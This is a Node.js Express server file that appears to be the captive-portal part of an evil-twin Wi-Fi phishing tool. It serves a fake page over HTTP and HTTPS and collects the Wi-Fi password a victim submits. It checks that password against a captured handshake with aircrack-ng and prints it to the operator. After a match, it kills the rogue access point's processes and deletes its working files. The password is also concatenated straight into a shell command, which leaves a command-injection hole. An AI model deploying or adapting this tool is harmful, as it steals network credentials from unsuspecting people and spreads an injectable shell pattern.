var express = require('express');
var path = require('path');
var bodyParser = require('body-parser');
var https = require('https');
var wait = require('wait-for-stuff');
var fs = require('fs');
var chalk = require('chalk');

var app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
var key = fs.readFileSync(path.join(__dirname + '/../ssl/private.key'));
var cert = fs.readFileSync(path.join(__dirname + '/../ssl/private.crt'));
var options = {
    key: key,
    cert: cert
};

app.get('/update', function (req, res) {
    res.sendFile(path.join(__dirname + '/update.html'));
    const exec = require('child_process').exec;
    var script = "killall xterm hostapd dnsmasq > /dev/null 2>&1;rm -rf tmp/ > /dev/null 2>&1;rm -rf sites/ > /dev/null 2>&1;service network-manager restart > /dev/null 2>&1";
    var exe = exec(script, (error, stdout, stderr) => { });
    wait.for.time(10);
    process.exit(0);
});

app.get('/error', function (req, res) {
    res.sendFile(path.join(__dirname + '/error.html'));
});

app.post('/check', function (req, res) {
    var pwd = req.body.pwd;
    var flag = 1;
    const exec = require('child_process').exec;
    var script = "echo "+pwd.toString()+" > tmp/wordlist;aircrack-ng -w tmp/wordlist tmp/wifi.hccapx | grep 'KEY FOUND!' -q;echo $?";
    var exe = exec(script, (error,stdout,stderr) => {
        flag = `${stdout}`;
        if (flag == 0) {
            console.log(chalk.bold.red("Password : " + pwd));
            res.redirect('/update');
        } else {
            res.redirect('/error');
        }
    });
});

app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname + '/main.html'));
});

app.get('*', function (req, res) {
    res.sendFile(path.join(__dirname + '/main.html'));
});

app.listen(80);
https.createServer(options, app).listen(443);